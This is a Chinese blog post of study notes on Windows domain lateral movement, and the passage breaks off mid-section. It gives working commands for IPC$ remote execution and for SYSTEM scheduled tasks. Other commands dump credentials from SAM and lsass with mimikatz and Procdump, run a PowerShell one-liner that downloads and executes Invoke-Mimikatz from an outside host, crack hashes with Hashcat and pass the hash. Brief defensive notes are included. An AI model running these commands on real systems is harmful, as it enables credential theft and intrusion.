<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-B0FHXMTYNC"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-B0FHXMTYNC');
</script>
<!-- End Google Analytics -->

  
  <title>内网安全攻防笔记(下) | Kizureina&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="第5章 域内横向移动分析及防御域内横向移动技术是在复杂的内网攻击中被广泛使用的一种技术，尤其是在高级持续威胁(Advanced Persistent Threats, APT)中。 攻击者会利用该技术，以被攻陷的系统为跳板，访问其他域内主机，扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产)。 1）常用Windows远程连接和相关命令■ 在渗透测">
<meta property="og:type" content="article">
<meta property="og:title" content="内网安全攻防笔记(下)">
<meta property="og:url" content="https://kizureina.github.io/2024/06/11/Note-of-Local-Address-Net-Security2/index.html">
<meta property="og:site_name" content="Kizureina&#39;s Blog">
<meta property="og:description" content="第5章 域内横向移动分析及防御域内横向移动技术是在复杂的内网攻击中被广泛使用的一种技术，尤其是在高级持续威胁(Advanced Persistent Threats, APT)中。 攻击者会利用该技术，以被攻陷的系统为跳板，访问其他域内主机，扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产)。 1）常用Windows远程连接和相关命令■ 在渗透测">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kizureina.github.io/images/image-20240611155334313.png">
<meta property="og:image" content="https://kizureina.github.io/images/image-20240611155429632.png">
<meta property="og:image" content="https://kizureina.github.io/images/image-20240611195751222.png">
<meta property="og:image" content="https://kizureina.github.io/images/image-20240611195945053.png">
<meta property="og:image" content="https://kizureina.github.io/images/image-20240611200048921.png">
<meta property="article:published_time" content="2024-06-11T06:53:04.000Z">
<meta property="article:modified_time" content="2024-06-12T01:36:03.822Z">
<meta property="article:author" content="Kizurena">
<meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kizureina.github.io/images/image-20240611155334313.png">
  
    <link rel="alternate" href="/atom.xml" title="Kizureina's Blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/banner.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>Kizureina's Blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
      <a class="main-nav-link" href="/links">Links</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
      <a class="nav-dropdown-link" href="/links">Links</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/assets/avatar2.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Kizureina </div>
      <div class="dot"></div>
      <div class="subtitle">I know nothing except the fact of my ignorance. </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Kizureina" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">标签</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Advanced-Mathematics/" rel="tag">Advanced Mathematics</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Anime/" rel="tag">Anime</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Comic/" rel="tag">Comic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Galgame/" rel="tag">Galgame</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Linear-Algebraic/" rel="tag">Linear Algebraic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Reverse-shell/" rel="tag">Reverse shell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" rel="tag">嵌入式</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">归档</h3>
      
      
        <a class="archive-link" href="/archives/2024/09 ">
          九月 2024 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/08 ">
          八月 2024 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/07 ">
          七月 2024 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/06 ">
          六月 2024 
          <div class="archive-count">5 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/05 ">
          五月 2024 
          <div class="archive-count">5 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/04 ">
          四月 2024 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/03 ">
          三月 2024 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/02 ">
          二月 2024 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2024/01 ">
          一月 2024 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/12 ">
          十二月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/11 ">
          十一月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/10 ">
          十月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/09 ">
          九月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/07 ">
          七月 2023 
          <div class="archive-count">5 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/06 ">
          六月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/03 ">
          三月 2023 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/02 ">
          二月 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/01 ">
          一月 2023 
          <div class="archive-count">4 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/12 ">
          十二月 2022 
          <div class="archive-count">3 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/11 ">
          十一月 2022 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/09 ">
          九月 2022 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/06 ">
          六月 2022 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/04 ">
          四月 2022 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/03 ">
          三月 2022 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/02 ">
          二月 2022 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2022/01 ">
          一月 2022 
          <div class="archive-count">3 </div>
        </a>
      
        <a class="archive-link" href="/archives/2021/12 ">
          十二月 2021 
          <div class="archive-count">1 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">最新文章</h3>
      <ul>
        
          <li>
            <a href="/2024/09/25/Note-of-Probability-Theory-and-Mathematical-Statistics/">概率论笔记</a>
          </li>
        
          <li>
            <a href="/2024/09/23/Log-of-interview-on-Sec/">2024秋招安全岗面经</a>
          </li>
        
          <li>
            <a href="/2024/08/01/Log-of-Summer-August/">暑假日志(八月)</a>
          </li>
        
          <li>
            <a href="/2024/07/12/Log-of-Summer/">暑假日志(七月)</a>
          </li>
        
          <li>
            <a href="/2024/06/18/Note-of-Linear-Algebraic/">线性代数笔记</a>
          </li>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-Note-of-Local-Address-Net-Security2" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        内网安全攻防笔记(下)
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-06-11T06:53:04.000Z" itemprop="datePublished">2024-06-11</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/WebSec/">WebSec</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            9.2k 词 
          </div>
        </div>
        
      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <h1 id="第5章-域内横向移动分析及防御"><a href="#第5章-域内横向移动分析及防御" class="headerlink" title="第5章 域内横向移动分析及防御"></a>第5章 域内横向移动分析及防御</h1><p><em>域内横向移动技术</em>是在复杂的内网攻击中被广泛使用的一种技术，尤其是在高级持续威胁(Advanced Persistent Threats, APT)中。</p>
<p>攻击者会利用该技术，以被攻陷的系统为<strong>跳板</strong>，访问其他域内主机，扩大资产范围（包括跳板机器中的文档和存储的凭证，以及通过跳板机器连接的数据库、域控制器或其他重要资产)。</p>
<h2 id="1）常用Windows远程连接和相关命令"><a href="#1）常用Windows远程连接和相关命令" class="headerlink" title="1）常用Windows远程连接和相关命令"></a>1）常用Windows远程连接和相关命令</h2><p>■ 在渗透测试中，拿到目标计算机的用户明文密码或者NTLM Hash后，可以通过PTH(Pass the Hash，<em>凭据传递</em>）的方法，将散列值或明文密码传送到目标机器中进行验证。</p>
<p>防御手段：可以通过配置Windows系统自带的防火墙或组策略进行防御。</p>
<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h3><p>概念：IPC(Internet Process Connection)共享“<strong>命名管道</strong>”的资源，是为了实现<strong>进程间通信</strong>而开放的命名管道。</p>
<p>IPC可以通过验证用户名和密码获得相应的权限，通常在<strong>远程管理</strong>计算机和査看计算机的<strong>共享资源</strong>时使用。</p>
<p>建立IPC:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ <span class="string">&quot;Aa123456&quot;</span> /user:administrator </span><br></pre></td></tr></table></figure>

<p>查看当前连接：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use</span><br></pre></td></tr></table></figure>

<p><code>ipc$</code>利用条件：</p>
<p>(1)开启了<strong>139、445</strong>端口</p>
<p>(2)管理员开启了默认共享</p>
<p>连接失败时常见错误号：</p>
<ul>
<li>错误号5：拒绝访问。</li>
<li>错误号51：Windows无法找到网络路径，即网络中存在问题。</li>
<li>错误号1326：未知的用户名或错误的密码。</li>
</ul>
<h3 id="IPC进一步利用"><a href="#IPC进一步利用" class="headerlink" title="IPC进一步利用"></a>IPC进一步利用</h3><p>可以使用IPC在目标机器执行命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出目标机器C盘的文件</span></span><br><span class="line"><span class="built_in">dir</span> \\192.168.1.1\c$</span><br></pre></td></tr></table></figure>

<p>查看目标机器进程列表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /S 192.168.1.1 /U administrator /P &lt;密码&gt;</span><br></pre></td></tr></table></figure>

<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><h4 id="at命令"><a href="#at命令" class="headerlink" title="at命令"></a>at命令</h4><p>at命令Windows自带的用于创建计划任务的命令，主要用于Windows 2008之前的版本。</p>
<p>主要使用流程:</p>
<ol>
<li><p>查看目标主机时间</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.4</span><br></pre></td></tr></table></figure></li>
<li><p>复制文件到目标系统：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy calc.bat \\192.168.1.4\C$</span><br></pre></td></tr></table></figure>
</li>
<li><p><em>使用at创建计划任务</em>（2008之前,net use）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.4 4:11PM C:\calc.bat </span><br></pre></td></tr></table></figure>
</li>
<li><p>清除at记录</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at \\192.168.1.4 1 /delete</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="schtasks命令-常用"><a href="#schtasks命令-常用" class="headerlink" title="schtasks命令(常用)"></a>schtasks命令(常用)</h4><p>用于Vista和2008之后的Windows系统。</p>
<p><strong>创建</strong>计划任务在开机时启动，启动程序为C盘下的<code>calc.bat</code>，启动权限为System：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 192.168.100.192 /tn <span class="built_in">test</span> /sc onstart /tr c:\calc.bat /ru system /u administrator /p Aa123456 /f</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>在ip为192.168.100.192的远程系统中（&#x2F;s） </li>
<li>创建一个名为test(&#x2F;tn)的计划任务 </li>
<li>开机时启动(&#x2F;sc) </li>
<li>运行的程序为(&#x2F;tr)C盘中的calc.bat </li>
<li>运行权限(&#x2F;ru)为system </li>
<li>如果已经存在同名的任务则强制创建（&#x2F;f）</li>
</ul>
</blockquote>
<p>运行计划任务test：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 192.168.1.1 /i /tn <span class="string">&quot;test&quot;</span></span><br></pre></td></tr></table></figure>

<p>删除该计划任务:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 192.168.1.1 /tn <span class="string">&quot;test&quot;</span> /f</span><br></pre></td></tr></table></figure>

<p>删除ipc:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1\ipc$ /del /y</span><br></pre></td></tr></table></figure>

<h2 id="2）Windows系统散列值获取分析及防范"><a href="#2）Windows系统散列值获取分析及防范" class="headerlink" title="2）Windows系统散列值获取分析及防范"></a>2）Windows系统散列值获取分析及防范</h2><p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash, 另一部分为NTLM Hash。</p>
<p>在Windows操作系统中，Hash的结构通常如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>

<p>从Windows Vista和Windows Server 2008版本开始，操作系统默认<strong>禁用</strong>LM Hash</p>
<ul>
<li><p>LM Hash明文密码被限定在<strong>14</strong>位以内，基于DES加密(密码长度大于14位会默认禁用LM Hash)</p>
</li>
<li><p>NTLM Hash基于<strong>MD4</strong>加密算法进行加密的</p>
</li>
</ul>
<h3 id="单机密码抓取与防范"><a href="#单机密码抓取与防范" class="headerlink" title="单机密码抓取与防范"></a>单机密码抓取与防范</h3><p>在Windows操作系统中抓取散列值或明文密码，必须将权限提升至System：</p>
<ul>
<li>本地用户名、散列值和其他安全验证信息都保存在<em>SAM文件</em>中。</li>
<li>路径位于 C:\Windows\System32\config，处于被锁定的状态，不允许复制。 </li>
<li><code>lsass.exe</code>进程用于实现安全策略 可以利用工具将散列值或明文密码从内存中的isass进程或SAM文件导出.</li>
<li>SAM文件可以在关闭Windows系统后，通过PE盘进入文件管理环境复制，或用VSS等方法直接复制。</li>
</ul>
<p>抓取密码的常用工具：</p>
<ol>
<li>GetPass </li>
<li>PwDump7 </li>
<li>QuarksPwDump</li>
</ol>
<h4 id="通过SAM文件和System文件抓取密码"><a href="#通过SAM文件和System文件抓取密码" class="headerlink" title="通过SAM文件和System文件抓取密码"></a>通过SAM文件和System文件抓取密码</h4><blockquote>
<p>mimikatz：是一款轻量级系统调试工具，可以从内存中提取明文密码、散列值、PIN和Kerberos票据。</p>
</blockquote>
<ul>
<li>使用<strong>管理员权限</strong>导出SAM文件：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>

<p>再将文件移动到mimikatz所在目录，使用mimikatz读取SAM文件和system文件获取NTLM Hash:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive  /system:system.hive</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以使用mimikatz直接读取本地SAM文件（需要上传到目标机器，考虑程序的免杀特性）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug  <span class="comment">#(提升权限)</span></span><br><span class="line">token::elevate    <span class="comment">#(将权限提升至system)</span></span><br><span class="line">lsadump::sam      <span class="comment">#(读取SAM文件)</span></span><br></pre></td></tr></table></figure>

<h4 id="mimikatz在线读取SAM"><a href="#mimikatz在线读取SAM" class="headerlink" title="mimikatz在线读取SAM"></a>mimikatz在线读取SAM</h4><p>即不下载SAM文件，直接从内存读取散列值和明文密码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="mimikatz离线读取lsass-dmp文件"><a href="#mimikatz离线读取lsass-dmp文件" class="headerlink" title="mimikatz离线读取lsass.dmp文件"></a>mimikatz离线读取lsass.dmp文件</h4><p>需要先导出lsass.dmp，可以使用任务管理器（找到lsass.exe右键直接选创建dump文件）或者Procdump工具：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Procdump64.exe -accepteula -ma lsass.exe lsass3.dmp</span><br></pre></td></tr></table></figure>

<p>再使用mimikatz导出lsass.dmp文件中的密码散列值，打开<em>mimikatz</em>执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp   <span class="comment"># 加载文件</span></span><br><span class="line">sekurlsa::logonPasswords full  <span class="comment"># 导出密码散列值</span></span><br></pre></td></tr></table></figure>

<h4 id="使用PowerShell对散列值进行Dump操作"><a href="#使用PowerShell对散列值进行Dump操作" class="headerlink" title="使用PowerShell对散列值进行Dump操作"></a>使用PowerShell对散列值进行Dump操作</h4><p>Nishang的Get-PassHashes.ps1脚本可用于导出散列值：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">Get-PassHashes</span>.ps1</span><br><span class="line"><span class="built_in">Get-PassHashes</span></span><br></pre></td></tr></table></figure>

<p>也可以远程加载mimikatz抓取散列值和密码：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).Downloadstring(<span class="string">&#x27;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>):<span class="built_in">Invoke-Mimikatz</span></span><br></pre></td></tr></table></figure>

<h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><p>■ Windows Server 2012及以上版本默认关闭Wdigest,使攻击者无法从内存中获取明文密码。</p>
<p>■ 2012以下版本，如果安装了KB2871997,攻击者同样无法获取明文密码。</p>
<p>■ 使用regadd命令或Powershell关闭Wdigest Auth</p>
<h3 id="使用Hashcat获取密码"><a href="#使用Hashcat获取密码" class="headerlink" title="使用Hashcat获取密码"></a>使用Hashcat获取密码</h3><p>Hashcat系列软件包括Hashcat、oclHashcat,还有一个单独的版本oclRausscrack。它们的区别为：</p>
<ul>
<li><p>Hashcat只支持<strong>CPU</strong>破解；</p>
</li>
<li><p>oclHashcat和oclGausscrack支持<strong>GPU</strong>加速破解。</p>
</li>
</ul>
<p>Hashcat常用参数：</p>
<blockquote>
<ul>
<li><p>-b:<em>测试使用当前机器进行破解的基准速度</em>(虚拟机需要1个CPU，1个核心，否则报错)</p>
</li>
<li><p>-m:<em>指定散列值的类型</em></p>
</li>
</ul>
<p><img src="/../images/image-20240611155334313.png" alt="image-20240611155334313"></p>
<ul>
<li>-a:number指定破解模式</li>
</ul>
<p><img src="/../images/image-20240611155429632.png" alt="image-20240611155429632"></p>
</blockquote>
<p>使用字典模式破解：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m xx &lt;hashfile&gt; &lt;zidianl&gt; &lt;zidian2&gt;</span><br></pre></td></tr></table></figure>

<p>■ -a 0：以<strong>字典模式</strong>破解。</p>
<p>■ -m xx：指定&lt;hashfile&gt;内的<strong>散列值类型</strong>。</p>
<p>■ &lt;hashfile&gt;：将<strong>多个散列值</strong>存入文本，等待破解。</p>
<p>■ &lt;zidian1&gt; &lt;zidian2&gt;:指定<strong>字典文件</strong>。</p>
<p>以1到8为指定数字破解：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 3 --increment --increment-min 1 --increment-max 8 ?d?d?d?d?d?d?d?d -O</span><br></pre></td></tr></table></figure>

<p>破解Windows散列值：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1000 -a 0 -o winpassok.txt win.hash password.1st --username</span><br></pre></td></tr></table></figure>

<p>破解WiFi握手包：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 抓包</span></span><br><span class="line">aircrack-ng  &lt;out.cap&gt; -J &lt;out.hccap&gt;</span><br><span class="line"><span class="comment"># 破解</span></span><br><span class="line">hashcat -m 2500 out.hccap dies.txt </span><br></pre></td></tr></table></figure>

<h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><ol>
<li>WindowsServer2012R2新增了一个名为“受保护的用户(Protected Users)”的用户组。只要将需要保护的用户放入该组，攻击者就无法使用mimikatz等工具抓取明文密码和散列值了。</li>
<li>通过修改注册表禁止在内存中存储明文密码。</li>
<li>将用于Debug权限的本地管理员从Administrators组中删除。防止mimikatz攻击。</li>
<li>安装系统补丁</li>
</ol>
<h2 id="3）哈希传递攻击分析与防范"><a href="#3）哈希传递攻击分析与防范" class="headerlink" title="3）哈希传递攻击分析与防范"></a>3）哈希传递攻击分析与防范</h2><p>哈希传递（Pass The Hash)攻击：通过找到与账户相关的密码散列值（通常是NTLM Hash)来进行攻击。</p>
<p>原理：<em>域账号与本地账号的账号密码往往相同</em>，方便获取账号对应的密码散列值；</p>
<p>特点：攻击者不需要花时间破解密码散列值，而是直接使用散列值登录其他系统，进而获得密码明文。</p>
<p>缺点：必须获取<strong>本地管理员权限</strong>。</p>
<blockquote>
<p>注：散列值的概念</p>
<p>当用户设置密码时，网站服务器会对用户输入的密码进行<strong>散列加密</strong>处理（通常使用MD5算法)。</p>
<p>散列加密算法一般为<strong>单向不可逆</strong>算法。当用户登录网站时，会先对用户输入的密码进行散列加密处理，再与数据库中存储的散列值进行对比，如果完全相同则表示验证成功。</p>
</blockquote>
<h3 id="使用NTLM-Hash进行哈希传递"><a href="#使用NTLM-Hash进行哈希传递" class="headerlink" title="使用NTLM Hash进行哈希传递"></a>使用NTLM Hash进行哈希传递</h3><p>使用mimikatz：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:&lt;用户名&gt; /domain:&lt;域名&gt; /ntlm:&lt;散列值&gt;&quot;</span></span><br></pre></td></tr></table></figure>

<p>此时可以登录目标域名的域控主机。</p>
<h3 id="使用AES-256密钥进行哈希传递"><a href="#使用AES-256密钥进行哈希传递" class="headerlink" title="使用AES-256密钥进行哈希传递"></a>使用AES-256密钥进行哈希传递</h3><p>先抓取AES-256密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::ekeys&quot;</span></span><br></pre></td></tr></table></figure>

<p>再用aes-256实现Hash传递攻击：</p>
